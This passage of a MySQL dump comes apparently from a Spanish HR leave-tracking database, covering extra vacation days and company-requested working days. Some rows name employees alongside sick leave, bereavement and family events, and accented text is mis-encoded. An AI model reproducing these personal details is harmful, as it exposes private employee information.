10:56:14'),(293,180,2022,'2022-12-09',2,'2022-03-10 10:56:14','2022-11-30 13:22:44'),(294,181,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(295,190,2022,'2022-05-12',2,'2022-03-10 10:56:14','2022-05-06 10:59:36'),(296,192,2022,'2022-06-27',2,'2022-03-10 10:56:14','2022-06-21 05:01:13'),(297,193,2022,'2022-12-12',2,'2022-03-10 10:56:14','2022-09-30 09:50:44'),(298,196,2022,'2022-08-14',2,'2022-03-10 10:56:14','2022-03-17 13:25:06'),(299,200,2022,'2022-04-19',2,'2022-03-10 10:56:14','2022-04-04 05:13:42'),(300,202,2022,'2022-07-23',2,'2022-03-10 10:56:14','2022-10-11 09:50:03'),(301,207,2022,'2022-11-11',2,'2022-03-10 10:56:14','2022-10-18 04:54:56'),(302,217,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(303,218,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(304,228,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(305,229,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(306,233,2022,'2022-12-13',2,'2022-03-10 10:56:14','2022-10-11 09:44:01'),(307,234,2022,'2022-03-17',2,'2022-03-10 10:56:14','2022-03-21 07:49:17'),(308,239,2022,'2022-08-15',2,'2022-03-10 10:56:14','2022-03-18 07:29:40'),(309,245,2022,'2022-11-11',2,'2022-03-10 10:56:14','2022-10-21 14:39:37'),(310,247,2022,'2022-09-26',2,'2022-03-10 10:56:14','2022-03-28 05:00:15'),(311,253,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(312,277,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(313,287,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(314,291,2022,'2022-08-22',2,'2022-03-10 10:56:14','2022-03-25 09:39:30'),(315,292,2022,'2022-08-04',2,'2022-03-10 10:56:14','2022-03-11 06:02:06'),(316,293,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(317,380,2022,'2022-10-27',2,'2022-03-10 10:56:14','2022-10-11 09:49:33'),(318,81,2022,'2022-08-16',2,'2022-03-15 07:16:17','2022-05-31 05:09:20'),(319,81,2022,'2022-08-17',2,'2022-03-15 07:16:31','2022-05-31 05:09:30'),(320,89,2022,NULL,0,'2022-03-15 07:17:00','2022-03-15 07:17:00'),(321,89,2022,NULL,0,'2022-03-15 07:17:09','2022-03-15 07:17:09'),(322,159,2022,'2022-11-30',2,'2022-03-15 07:17:25','2022-08-29 07:09:51'),(323,159,2022,'2022-11-18',2,'2022-03-15 07:17:36','2022-08-29 07:10:33'),(324,167,2022,'2022-05-18',2,'2022-03-15 07:17:57','2022-10-11 09:51:57'),(325,167,2022,'2022-05-19',2,'2022-03-15 07:18:13','2022-10-11 09:52:21'),(326,171,2022,'2022-08-25',2,'2022-03-15 07:23:16','2022-07-29 12:50:35'),(327,171,2022,'2022-08-26',2,'2022-03-15 07:23:26','2022-07-29 12:54:16'),(328,178,2022,NULL,0,'2022-03-15 07:23:54','2022-03-15 07:23:54'),(329,180,2022,'2022-12-10',2,'2022-03-15 07:24:11','2022-11-30 13:22:40'),(330,181,2022,NULL,0,'2022-03-15 07:24:33','2022-03-15 07:24:33'),(331,190,2022,'2022-06-11',2,'2022-03-15 07:24:54','2022-05-11 12:32:53'),(332,192,2022,'2022-06-28',2,'2022-03-15 07:25:09','2022-06-21 05:01:16'),(333,193,2022,'2022-12-13',2,'2022-03-15 07:25:28','2022-09-30 09:50:08'),(334,196,2022,'2022-08-13',2,'2022-03-15 07:25:45','2022-03-18 06:25:59'),(335,200,2022,'2022-04-20',2,'2022-03-15 07:26:07','2022-04-04 05:13:48'),(336,202,2022,'2022-07-24',2,'2022-03-15 07:26:32','2022-10-11 09:49:58'),(337,207,2022,'2022-12-19',2,'2022-03-15 07:26:51','2022-10-18 04:56:04'),(338,228,2022,NULL,0,'2022-03-15 07:27:22','2022-03-15 07:27:22'),(339,228,2022,NULL,0,'2022-03-15 07:27:30','2022-03-15 07:27:30'),(340,229,2022,NULL,0,'2022-03-15 07:27:49','2022-03-15 07:27:49'),(341,229,2022,NULL,0,'2022-03-15 07:28:01','2022-03-15 07:28:01'),(342,233,2022,'2022-12-15',2,'2022-03-15 07:28:33','2022-10-11 09:43:50'),(343,233,2022,'2022-12-14',2,'2022-03-15 07:28:45','2022-10-11 09:43:56'),(344,234,2022,'2022-03-15',2,'2022-03-15 07:29:14','2022-03-21 07:49:21'),(345,234,2022,'2022-03-16',2,'2022-03-15 07:29:32','2022-03-21 07:49:13'),(346,239,2022,'2022-08-16',2,'2022-03-15 07:29:49','2022-03-18 07:29:46'),(347,247,2022,'2022-12-19',2,'2022-03-15 07:30:12','2022-03-28 05:00:52'),(348,277,2022,NULL,0,'2022-03-15 07:30:36','2022-03-15 07:30:36'),(349,277,2022,NULL,0,'2022-03-15 07:30:47','2022-03-15 07:30:47'),(350,291,2022,'2022-08-23',2,'2022-03-15 07:31:14','2022-03-25 09:39:24'),(351,380,2022,'2022-10-26',2,'2022-03-15 07:31:44','2022-10-11 09:49:16'),(352,197,2022,'2022-07-07',2,'2022-03-16 08:29:09','2022-04-25 09:56:37'),(353,197,2022,'2022-09-15',2,'2022-03-16 08:29:21','2022-08-19 15:50:40'),(355,443,2022,'2022-12-30',2,'2022-12-12 17:10:22','2022-12-13 05:58:35'),(385,81,2023,'2023-05-29',2,'2023-04-17 06:02:01','2023-05-23 05:36:06'),(386,81,2023,'2023-10-10',2,'2023-04-17 06:02:01','2023-09-18 05:02:39'),(387,81,2023,'2023-12-07',2,'2023-04-17 06:02:01','2023-11-21 12:09:09'),(388,159,2023,'2023-10-28',2,'2023-04-17 06:02:01','2023-08-23 06:02:38'),(389,159,2023,'2023-10-29',2,'2023-04-17 06:02:01','2023-08-23 06:01:51'),(390,159,2023,'2023-09-22',2,'2023-04-17 06:02:01','2023-05-17 05:45:35'),(391,180,2023,'2023-07-13',2,'2023-04-17 06:02:01','2023-06-28 09:36:25'),(392,180,2023,'2023-07-14',2,'2023-04-17 06:02:01','2023-06-28 09:36:20'),(393,190,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(394,190,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(395,192,2023,'2023-09-26',2,'2023-04-17 06:02:01','2023-09-19 05:17:00'),(396,192,2023,'2023-01-20',2,'2023-04-17 06:02:01','2023-09-19 05:19:12'),(397,193,2023,'2023-05-27',2,'2023-04-17 06:02:01','2023-04-28 04:56:03'),(398,193,2023,'2023-05-28',2,'2023-04-17 06:02:01','2023-04-28 04:56:11'),(399,193,2023,'2023-12-12',2,'2023-04-17 06:02:01','2023-10-31 07:20:44'),(400,196,2023,'2023-05-02',2,'2023-04-17 06:02:01','2023-04-17 06:05:23'),(401,196,2023,'2023-08-28',2,'2023-04-17 06:02:01','2023-05-10 06:33:36'),(402,197,2023,'2023-08-23',2,'2023-04-17 06:02:01','2023-04-17 06:04:05'),(403,197,2023,'2023-08-24',2,'2023-04-17 06:02:01','2023-04-17 06:04:24'),(404,200,2023,'2024-01-05',2,'2023-04-17 06:02:01','2023-12-11 06:29:31'),(405,200,2023,'2024-01-06',2,'2023-04-17 06:02:01','2023-12-11 06:29:26'),(406,207,2023,'2023-07-25',2,'2023-04-17 06:02:01','2023-05-10 05:22:41'),(407,207,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(408,217,2023,'2023-09-02',2,'2023-04-17 06:02:01','2023-09-18 06:59:04'),(409,239,2023,'2023-08-16',2,'2023-04-17 06:02:01','2023-06-26 09:17:31'),(410,239,2023,'2023-08-17',2,'2023-04-17 06:02:01','2023-06-26 09:17:47'),(411,244,2023,'2023-08-03',2,'2023-04-17 06:02:01','2023-04-25 05:06:58'),(412,247,2023,'2023-10-02',2,'2023-04-17 06:02:01','2023-06-26 09:22:43'),(413,247,2023,'2023-10-03',2,'2023-04-17 06:02:01','2023-06-26 09:22:50'),(414,292,2023,'2023-09-28',2,'2023-04-17 06:02:01','2023-09-11 12:09:55'),(415,89,2023,'2023-07-13',2,'2023-04-17 06:02:01','2023-09-18 07:08:51'),(416,89,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(417,89,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(418,167,2023,'2023-07-31',2,'2023-04-17 06:02:01','2023-09-18 07:06:44'),(419,167,2023,'2023-08-15',2,'2023-04-17 06:02:01','2023-09-18 07:06:58'),(420,167,2023,'2023-06-24',2,'2023-04-17 06:02:01','2023-05-15 06:43:09'),(421,202,2023,'2023-08-14',2,'2023-04-17 06:02:01','2023-09-18 07:02:23'),(422,202,2023,'2023-08-15',2,'2023-04-17 06:02:01','2023-09-18 07:02:40'),(424,218,2023,'2023-07-25',2,'2023-04-17 06:02:01','2023-09-18 07:01:14'),(425,234,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(426,234,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(427,234,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(428,253,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(429,287,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(430,293,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(431,306,2023,NULL,0,'2023-04-17 06:02:01','2023-04-17 06:02:01'),(432,371,2023,'2023-08-18',2,'2023-04-17 06:02:01','2023-09-18 07:05:14'),(433,380,2023,'2023-10-05',2,'2023-04-17 06:02:01','2023-09-18 06:56:34'),(434,380,2023,'2023-10-06',2,'2023-04-17 06:02:01','2023-09-18 06:56:40'),(436,81,2024,'2024-11-25',2,'2024-02-07 06:02:09','2024-09-04 03:48:06'),(437,81,2024,'2024-11-26',2,'2024-02-07 06:02:09','2024-09-04 03:48:13'),(438,81,2024,'2024-11-27',2,'2024-02-07 06:02:09','2024-09-04 03:48:18'),(439,89,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(440,89,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(441,89,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(442,159,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(443,159,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(444,159,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(445,171,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(446,171,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(447,171,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(448,178,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(449,178,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(450,178,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(451,180,2024,'2024-12-17',1,'2024-02-07 06:02:09','2024-12-13 14:37:45'),(452,180,2024,'2024-10-03',1,'2024-02-07 06:02:09','2024-12-13 14:37:22'),(453,180,2024,'2024-01-20',1,'2024-02-07 06:02:09','2024-12-13 14:37:06'),(454,181,2024,'2024-10-20',2,'2024-02-07 06:02:09','2024-09-23 06:43:02'),(455,181,2024,'2024-10-12',2,'2024-02-07 06:02:09','2024-09-23 06:42:54'),(456,181,2024,'2024-10-19',2,'2024-02-07 06:02:09','2024-09-23 06:43:09'),(457,190,2024,'2024-10-14',2,'2024-02-07 06:02:09','2024-10-08 12:56:46'),(458,190,2024,'2024-08-06',2,'2024-02-07 06:02:09','2024-07-24 11:14:03'),(459,190,2024,'2024-12-24',2,'2024-02-07 06:02:09','2024-12-09 05:37:14'),(460,192,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(461,192,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(462,193,2024,'2024-09-23',1,'2024-02-07 06:02:09','2024-08-09 19:50:59'),(463,193,2024,'2024-09-24',1,'2024-02-07 06:02:09','2024-08-09 19:51:21'),(464,193,2024,'2024-09-25',1,'2024-02-07 06:02:09','2024-08-09 19:51:36'),(465,196,2024,'2024-08-07',2,'2024-02-07 06:02:09','2024-02-23 06:30:43'),(466,196,2024,'2024-08-08',2,'2024-02-07 06:02:09','2024-02-23 06:30:49'),(467,198,2024,'2024-10-09',2,'2024-02-07 06:02:09','2024-09-03 12:04:35'),(468,198,2024,'2024-10-07',2,'2024-02-07 06:02:09','2024-09-03 12:04:27'),(469,198,2024,'2024-10-08',2,'2024-02-07 06:02:09','2024-09-03 12:04:32'),(470,201,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(471,201,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(472,202,2024,'2024-08-11',2,'2024-02-07 06:02:09','2024-07-04 11:21:15'),(473,202,2024,'2024-08-12',2,'2024-02-07 06:02:09','2024-07-04 11:21:24'),(474,207,2024,'2024-11-04',2,'2024-02-07 06:02:09','2024-10-16 05:03:08'),(475,207,2024,'2024-11-05',2,'2024-02-07 06:02:09','2024-10-16 05:02:53'),(476,217,2024,'2024-07-27',2,'2024-02-07 06:02:09','2024-09-23 06:48:50'),(477,218,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(478,239,2024,'2024-11-09',2,'2024-02-07 06:02:09','2024-09-27 08:33:45'),(479,239,2024,'2024-11-08',2,'2024-02-07 06:02:09','2024-09-27 08:33:27'),(480,245,2024,'2024-11-30',2,'2024-02-07 06:02:09','2024-11-12 09:21:50'),(481,245,2024,'2024-12-01',2,'2024-02-07 06:02:09','2024-11-12 09:21:53'),(482,247,2024,'2024-10-16',2,'2024-02-07 06:02:09','2024-09-02 05:45:03'),(483,247,2024,'2024-10-17',2,'2024-02-07 06:02:09','2024-09-02 05:45:07'),(484,253,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(485,276,2024,'2024-04-15',2,'2024-02-07 06:02:09','2024-09-23 06:45:38'),(486,276,2024,'2024-04-17',2,'2024-02-07 06:02:09','2024-09-23 06:45:30'),(487,276,2024,'2024-04-16',2,'2024-02-07 06:02:09','2024-09-23 06:45:47'),(488,287,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(489,287,2024,NULL,0,'2024-02-07 06:02:09','2024-02-07 06:02:09'),(490,292,2024,'2024-03-14',2,'2024-02-07 06:02:09','2024-02-09 05:28:50'),(491,292,2024,'2024-09-07',2,'2024-02-07 06:02:09','2024-06-13 08:25:38'),(492,306,2024,'2024-06-13',2,'2024-02-07 06:02:09','2024-07-04 11:20:47'),(493,371,2024,'2024-07-12',2,'2024-02-07 06:02:09','2024-07-04 11:31:21'),(494,380,2024,'2024-10-10',2,'2024-02-07 06:02:09','2024-09-23 06:39:47'),(495,380,2024,'2024-09-16',2,'2024-02-07 06:02:09','2024-07-04 11:19:52'),(496,407,2024,'2024-06-01',2,'2024-02-07 06:02:09','2024-07-04 11:21:03'),(497,407,2024,'2024-06-02',2,'2024-02-07 06:02:09','2024-07-04 11:21:09'),(498,81,2025,'2025-08-12',2,'2025-01-29 10:21:52','2025-06-23 08:10:12'),(499,81,2025,'2025-08-13',2,'2025-01-29 10:21:52','2025-06-23 05:32:17'),(500,81,2025,'2025-08-14',2,'2025-01-29 10:21:52','2025-06-23 05:32:13'),(501,178,2025,'2025-11-01',1,'2025-01-29 10:21:52','2025-10-09 16:05:50'),(502,178,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(503,178,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(507,180,2025,'2025-11-03',1,'2025-01-29 10:21:52','2025-10-22 08:59:07'),(508,180,2025,'2025-09-08',2,'2025-01-29 10:21:52','2025-08-19 04:54:30'),(509,180,2025,'2025-06-09',2,'2025-01-29 10:21:52','2025-06-13 07:40:58'),(510,181,2025,'2025-10-13',2,'2025-01-29 10:21:52','2025-09-11 11:32:24'),(511,181,2025,'2025-06-21',2,'2025-01-29 10:21:52','2025-09-11 11:32:19'),(512,181,2025,'2025-10-11',2,'2025-01-29 10:21:52','2025-09-11 11:32:28'),(513,192,2025,'2025-11-10',2,'2025-01-29 10:21:52','2025-08-19 04:59:10'),(514,192,2025,'2025-11-11',2,'2025-01-29 10:21:52','2025-08-19 04:59:13'),(515,193,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(516,193,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(517,193,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(518,196,2025,'2025-08-22',2,'2025-01-29 10:21:52','2025-01-29 11:18:54'),(519,196,2025,'2025-08-25',2,'2025-01-29 10:21:52','2025-01-29 11:19:03'),(520,198,2025,'2025-10-18',2,'2025-01-29 10:21:52','2025-09-16 08:04:01'),(521,198,2025,'2026-01-02',2,'2025-01-29 10:21:52','2025-11-28 06:12:31'),(522,198,2025,'2026-01-10',2,'2025-01-29 10:21:52','2025-11-28 06:12:40'),(523,200,2025,'2025-05-16',2,'2025-01-29 10:21:52','2025-05-08 05:25:17'),(524,200,2025,'2025-05-23',2,'2025-01-29 10:21:52','2025-05-08 05:25:22'),(527,207,2025,'2025-10-18',2,'2025-01-29 10:21:52','2025-09-05 04:10:58'),(528,207,2025,'2025-11-08',2,'2025-01-29 10:21:52','2025-09-18 06:14:57'),(529,207,2025,'2025-11-09',2,'2025-01-29 10:21:52','2025-09-18 06:15:02'),(530,218,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(531,239,2025,'2025-06-01',2,'2025-01-29 10:21:52','2025-04-17 15:19:00'),(532,239,2025,'2025-05-18',2,'2025-01-29 10:21:52','2025-05-12 12:30:23'),(533,244,2025,'2025-06-24',2,'2025-01-29 10:21:52','2025-04-24 05:31:20'),(534,244,2025,'2025-12-19',2,'2025-01-29 10:21:52','2025-10-22 12:25:53'),(535,247,2025,'2025-06-17',2,'2025-01-29 10:21:52','2025-04-13 08:11:45'),(536,247,2025,'2025-06-18',2,'2025-01-29 10:21:52','2025-04-13 08:11:34'),(537,253,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(538,284,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(539,284,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(540,292,2025,'2025-11-25',2,'2025-01-29 10:21:52','2025-11-04 06:05:35'),(541,292,2025,'2025-12-02',2,'2025-01-29 10:21:52','2025-11-11 07:09:47'),(542,306,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(543,369,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(544,369,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(545,371,2025,'2025-08-22',1,'2025-01-29 10:21:52','2025-10-06 08:37:11'),(546,380,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(547,380,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(548,380,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(549,402,2025,'2025-08-27',1,'2025-01-29 10:21:52','2025-10-06 09:12:51'),(550,407,2025,'2025-08-25',2,'2025-01-29 10:21:52','2025-05-12 10:06:54'),(551,407,2025,'2025-08-26',2,'2025-01-29 10:21:52','2025-05-12 10:06:49'),(552,424,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(553,424,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(554,429,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(555,429,2025,NULL,0,'2025-01-29 10:21:52','2025-01-29 10:21:52'),(556,81,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(557,81,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(558,81,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(559,178,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(560,178,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(561,178,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(562,180,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(563,180,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(564,180,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(565,181,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(566,181,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(567,181,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(568,196,2026,'2026-08-16',2,'2026-02-06 07:10:43','2026-03-03 06:27:58'),(569,196,2026,'2026-08-22',2,'2026-02-06 07:10:43','2026-03-03 06:28:22'),(570,196,2026,'2026-08-23',2,'2026-02-06 07:10:43','2026-03-03 06:28:47'),(571,200,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(572,200,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(573,200,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(574,201,2026,'2026-07-23',2,'2026-02-06 07:10:43','2026-05-04 05:29:21'),(575,201,2026,'2026-07-22',2,'2026-02-06 07:10:43','2026-05-04 12:14:00'),(576,201,2026,'2026-07-24',2,'2026-02-06 07:10:43','2026-05-04 05:29:19'),(577,207,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(578,207,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(579,207,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(580,217,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(581,217,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(582,239,2026,'2026-09-01',2,'2026-02-06 07:10:43','2026-02-25 06:18:44'),(583,239,2026,'2026-09-02',2,'2026-02-06 07:10:43','2026-02-25 06:18:50'),(584,239,2026,'2026-09-03',2,'2026-02-06 07:10:43','2026-02-25 06:18:58'),(585,244,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(586,244,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(587,247,2026,'2026-07-28',2,'2026-02-06 07:10:43','2026-02-06 10:45:35'),(588,247,2026,'2026-07-29',2,'2026-02-06 07:10:43','2026-02-06 10:45:40'),(589,247,2026,'2026-07-30',2,'2026-02-06 07:10:43','2026-02-06 10:45:46'),(590,253,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(591,284,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(592,284,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(593,284,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(594,287,2026,'2026-04-29',2,'2026-02-06 07:10:43','2026-05-05 08:37:47'),(595,287,2026,'2026-05-14',2,'2026-02-06 07:10:43','2026-05-05 08:38:05'),(596,306,2026,'2026-02-23',2,'2026-02-06 07:10:43','2026-02-19 09:36:16'),(597,306,2026,'2026-02-24',2,'2026-02-06 07:10:43','2026-02-19 09:36:12'),(598,369,2026,'2026-07-24',1,'2026-02-06 07:10:43','2026-02-13 10:50:10'),(599,369,2026,'2026-07-25',1,'2026-02-06 07:10:43','2026-02-13 10:50:31'),(600,371,2026,'2026-08-14',1,'2026-02-06 07:10:43','2026-04-28 16:04:34'),(601,380,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(602,380,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(603,380,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(604,402,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43'),(605,407,2026,'2026-06-12',1,'2026-02-06 07:10:43','2026-02-20 14:01:14'),(606,407,2026,'2026-06-13',1,'2026-02-06 07:10:43','2026-02-20 14:01:35'),(607,407,2026,'2026-06-14',1,'2026-02-06 07:10:43','2026-02-20 14:02:01'),(608,429,2026,'2026-08-08',1,'2026-02-06 07:10:43','2026-04-08 08:32:07'),(609,429,2026,'2026-08-09',1,'2026-02-06 07:10:43','2026-04-08 08:32:25'),(610,443,2026,NULL,0,'2026-02-06 07:10:43','2026-02-06 07:10:43');
/*!40000 ALTER TABLE `dia_adicional_vacaciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dias_pedidos_empresa`
--

DROP TABLE IF EXISTS `dias_pedidos_empresa`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dias_pedidos_empresa` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `fecha` date NOT NULL,
  `motivo_peticion` varchar(255) NOT NULL,
  `fecha_devolucion` date DEFAULT NULL,
  `motivo_devolucion` varchar(255) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 0,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo_agente_2` (`codigo_agente`,`fecha`),
  CONSTRAINT `dias_pedidos_empresa_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=124 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dias_pedidos_empresa`
--

LOCK TABLES `dias_pedidos_empresa` WRITE;
/*!40000 ALTER TABLE `dias_pedidos_empresa` DISABLE KEYS */;
INSERT INTO `dias_pedidos_empresa` VALUES (8,155,'2017-12-16','BAJA DE IZASKUN PASCUAL.\r\nPIDE GUARDAR LOS DГҚAS PARA EL 2018(NO REGISTRADOS EN SAP)','2018-07-06','Por boda del Hijo',1,'2018-01-08 08:57:21','2018-11-26 08:30:08'),(9,155,'2017-12-17','BAJA DE IZASKUN PASCUAL.\r\nPIDE GUARDAR LOS DГҚAS PARA EL 2018(NO REGISTRADOS EN SAP)',NULL,'',0,'2018-01-08 08:58:05','2018-01-08 12:22:10'),(10,370,'2017-11-13','FormaciГіn extinciГіn de incendios','2019-01-09','solicitado por Jorge  esquiar',2,'2018-01-16 08:29:12','2019-01-03 09:18:58'),(11,253,'2017-03-15','Curso AGS','2018-09-15','',2,'2018-01-16 08:35:27','2018-08-31 09:03:00'),(12,191,'2017-05-31',' F14 Curso de formaciГіn','2018-06-01','',2,'2018-02-20 06:57:50','2018-08-28 17:58:46'),(13,191,'2017-11-28','FSR ReuniГіn sindical','2018-10-19','',2,'2018-02-20 06:58:35','2018-11-16 07:04:43'),(14,228,'2017-05-31','Curso enclavamiento CAF, CAMBIADO DIA A DISFRUTAR POR FSR 2017 ','2018-11-01','solicitado agente',2,'2018-02-20 07:32:12','2018-12-20 06:59:33'),(15,370,'2017-11-28','FormaciГіn primeros auxilios','2019-01-10','solicitado Jorge esquiar',2,'2018-02-20 07:33:54','2019-01-03 09:18:53'),(16,200,'2018-03-10','FALTA DE PERSONAL','2018-05-05','',2,'2018-02-22 11:19:41','2018-08-06 14:53:00'),(17,200,'2018-03-11','FALTA PERSONAL','2018-05-06','',2,'2018-02-22 11:20:08','2018-08-06 14:51:51'),(18,197,'2018-04-04','ENFERMEDAD AGENTE','2018-08-10','',2,'2018-04-18 06:56:11','2018-08-06 14:53:42'),(19,197,'2016-05-16','CURSO EIBAR','2018-08-17','',2,'2018-04-18 06:57:19','2018-08-06 14:53:52'),(20,197,'2016-05-05','ENFERMEDAD AGENTE','2018-08-13','',2,'2018-04-18 06:58:25','2018-08-06 14:53:23'),(21,200,'2017-12-15','ReuniГіn riesgos sicosociales','2018-05-24','',2,'2018-05-13 04:11:50','2018-08-06 14:52:53'),(22,382,'2018-05-18','Baja en su turno de vacaciones 18 al 20/05','2018-12-14','',2,'2018-05-21 06:37:23','2018-09-14 06:30:30'),(23,375,'2017-11-20','VACACIONES AГ‘O ANTERIOR','2018-05-14','VACACIONES AГ‘O ANTERIOR',2,'2018-05-22 04:50:29','2018-08-06 14:54:15'),(24,375,'2017-12-19','VACACIONES AГ‘O ANTERIOR','2018-05-15','VACACIONES AГ‘O ANTERIOR',2,'2018-05-22 04:50:50','2018-08-06 14:54:29'),(25,375,'2017-12-20','VACACIONES AГ‘O ANTERIOR','2018-05-16','VACACIONES AГ‘O ANTERIOR',2,'2018-05-22 04:51:12','2018-08-06 14:54:09'),(26,375,'2017-12-21','VACACIONES AГ‘O ANTERIOR','2018-05-17','VACACIONES AГ‘O ANTERIOR',2,'2018-05-22 04:51:34','2018-08-06 14:54:22'),(27,218,'2018-06-14','Curso Toma de decisiones. VAC','2024-09-03','Fallecimiento tio',1,'2018-06-01 05:46:48','2024-09-02 05:14:11'),(29,218,'2018-07-05','Licencia Nuria','2021-07-02','',1,'2018-06-29 10:09:12','2021-06-15 15:00:50'),(30,133,'2018-06-13','No se le conceden los dos dГӯas de cambio de domicilio. Quedan pendientes',NULL,'',2,'2018-07-04 06:36:32','2019-10-07 12:41:01'),(31,133,'2018-07-10','Se le 